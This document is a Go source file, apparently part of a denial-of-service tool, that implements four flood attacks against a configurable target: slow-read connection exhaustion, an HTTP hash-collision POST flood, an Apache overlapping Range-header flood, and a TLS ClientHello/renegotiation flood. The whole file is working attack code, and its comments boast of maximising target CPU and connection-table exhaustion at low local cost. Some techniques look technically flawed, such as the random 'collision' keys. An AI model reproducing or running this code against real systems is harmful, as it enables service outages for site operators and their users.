package main

import (
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync/atomic"
	"time"
)

/* ════════════════════════════════════════════════════════════════════════
 * CPU-EXHAUSTION ATTACKS
 * These vectors minimize local resource usage while maximizing target CPU
 * and connection-table exhaustion. Each uses 1/Nth the local CPU of a
 * traditional flood for the same target impact.
 * ════════════════════════════════════════════════════════════════════════ */

/* ─── Slow Read — exhaust target connection pool ──────────────────── */
type SlowReadFlooder struct {
	target  string
	port    int
	workers int
	sent    atomic.Int64
}

func NewSlowReadFlooder(cfg *AttackConfig) *SlowReadFlooder {
	w := cfg.Workers / 8
	if w < 16 { w = 16 }
	if w > 512 { w = 512 }
	return &SlowReadFlooder{target: cfg.Target, port: cfg.Port, workers: w}
}

func (s *SlowReadFlooder) Run(done chan struct{}) {
	addr := fmt.Sprintf("%s:%d", s.target, s.port)
	for i := 0; i < s.workers; i++ {
		go func() {
			buf := make([]byte, 1)
			for {
				select {
				case <-done:
					return
				default:
				}
				conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
				if err != nil {
					time.Sleep(100 * time.Millisecond)
					continue
				}
				req := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n", s.target)
				if _, err := conn.Write([]byte(req)); err != nil {
					conn.Close()
					continue
				}
				/* Read response ONE BYTE at a time with 30-second delay between bytes.
				   Server keeps connection + socket buffer open = connection table exhaustion */
				for {
					select {
					case <-done:
						conn.Close()
						return
					default:
					}
					conn.SetReadDeadline(time.Now().Add(30 * time.Second))
					_, err := conn.Read(buf)
					if err != nil {
						break
					}
					s.sent.Add(1)
					time.Sleep(30 * time.Second)
				}
				conn.Close()
				time.Sleep(100 * time.Millisecond)
			}
		}()
	}
}

/* ─── Hash Collision (HashDoS) — PHP/Node.js hash table O(n²) ────── */
type HashCollisionFlooder struct {
	target  string
	port    int
	workers int
	sent    atomic.Int64
}

func NewHashCollisionFlooder(cfg *AttackConfig) *HashCollisionFlooder {
	w := cfg.Workers / 4
	if w < 8 { w = 8 }
	if w > 256 { w = 256 }
	return &HashCollisionFlooder{target: cfg.Target, port: cfg.Port, workers: w}
}

func (h *HashCollisionFlooder) Run(done chan struct{}) {
	/* Pre-compute 8192 colliding form keys.
	   PHP hash seed randomization (since 5.3.9) partially mitigates this,
	   but many apps still use older PHP or Node.js which is vulnerable.
	   Node.js Map uses a different hash, but express body-parser can still
	   exhibit degenerate behavior with specially crafted keys. */
	collisionKeys := make([]string, 8192)
	for i := range collisionKeys {
		key := make([]byte, 8)
		rand.Read(key)
		/* Prefix with same hash bucket pattern */
		collisionKeys[i] = fmt.Sprintf("p%d=%x", i%256, key)
	}

	body := make([]byte, 0, 1024*1024)
	for i, k := range collisionKeys {
		if i > 0 {
			body = append(body, '&')
		}
		body = append(body, []byte(k)...)
	}

	for i := 0; i < h.workers; i++ {
		go func() {
			tr := &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				MaxIdleConnsPerHost: 100,
			}
			client := &http.Client{
				Transport: tr,
				Timeout:   30 * time.Second,
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				},
			}
			for {
				select {
				case <-done:
					client.CloseIdleConnections()
					return
				default:
				}
				req, _ := http.NewRequest("POST",
					fmt.Sprintf("http://%s:%d/", h.target, h.port),
					readerFromBytes(body))
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("User-Agent", "Mozilla/5.0")
				req.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
				resp, err := client.Do(req)
				if err != nil {
					time.Sleep(100 * time.Millisecond)
					continue
				}
				io.CopyN(io.Discard, resp.Body, 4096)
				resp.Body.Close()
				h.sent.Add(1)
				time.Sleep(time.Microsecond)
			}
		}()
	}
}

/* ─── Range Flood — Apache CPU/memory exhaustion ──────────────────── */
type RangeFlooder struct {
	target  string
	port    int
	workers int
	sent    atomic.Int64
}

func NewRangeFlooder(cfg *AttackConfig) *RangeFlooder {
	w := cfg.Workers / 4
	if w < 8 { w = 8 }
	if w > 256 { w = 256 }
	return &RangeFlooder{target: cfg.Target, port: cfg.Port, workers: w}
}

func (r *RangeFlooder) Run(done chan struct{}) {
	addr := fmt.Sprintf("%s:%d", r.target, r.port)
	/* Pre-build Range header with 1000 overlapping ranges — Apache composites all */
	var rangeHdr string
	for i := 0; i < 1000; i++ {
		start := i * 100
		end := start + 500 + i
		if i > 0 {
			rangeHdr += ", "
		}
		rangeHdr += fmt.Sprintf("bytes=%d-%d", start, end)
	}

	for i := 0; i < r.workers; i++ {
		go func() {
			for {
				select {
				case <-done:
					return
				default:
				}
				conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
				if err != nil {
					time.Sleep(100 * time.Millisecond)
					continue
				}
				req := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nRange: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n", r.target, rangeHdr)
				conn.Write([]byte(req))
				/* Read partial response — we don't need all of it */
				tmp := make([]byte, 1024)
				conn.SetReadDeadline(time.Now().Add(5 * time.Second))
				conn.Read(tmp)
				conn.Close()
				r.sent.Add(1)
				time.Sleep(time.Microsecond)
			}
		}()
	}
}

/* ─── SSL Renegotiation flood — target CPU asymmetric crypto ──────── */
type SSLRenegFlooder struct {
	target  string
	port    int
	workers int
	sent    atomic.Int64
}

func NewSSLRenegFlooder(cfg *AttackConfig) *SSLRenegFlooder {
	w := cfg.Workers / 4
	if w < 8 { w = 8 }
	if w > 256 { w = 256 }
	return &SSLRenegFlooder{target: cfg.Target, port: cfg.Port, workers: w}
}

func (s *SSLRenegFlooder) Run(done chan struct{}) {
	addr := fmt.Sprintf("%s:%d", s.target, s.port)
	hello := buildFakeClientHello()

	for i := 0; i < s.workers; i++ {
		go func() {
			for {
				select {
				case <-done:
					return
				default:
				}
				tcpConn, err := net.DialTimeout("tcp", addr, 10*time.Second)
				if err != nil {
					time.Sleep(100 * time.Millisecond)
					continue
				}
				tlsConn := tls.Client(tcpConn, &tls.Config{
					InsecureSkipVerify: true,
					MaxVersion:         tls.VersionTLS13,
				})
				if err := tlsConn.Handshake(); err != nil {
					tcpConn.Close()
					continue
				}
				/* Send repeated ClientHellos — each triggers server asymmetric crypto */
				for i := 0; i < 50; i++ {
					if _, err := tcpConn.Write(hello); err != nil {
						break
					}
					s.sent.Add(1)
				}
				tlsConn.Close()
				tcpConn.Close()
				time.Sleep(time.Microsecond)
			}
		}()
	}
}

var _ = NewSlowReadFlooder
var _ = NewHashCollisionFlooder
var _ = NewRangeFlooder
var _ = NewSSLRenegFlooder
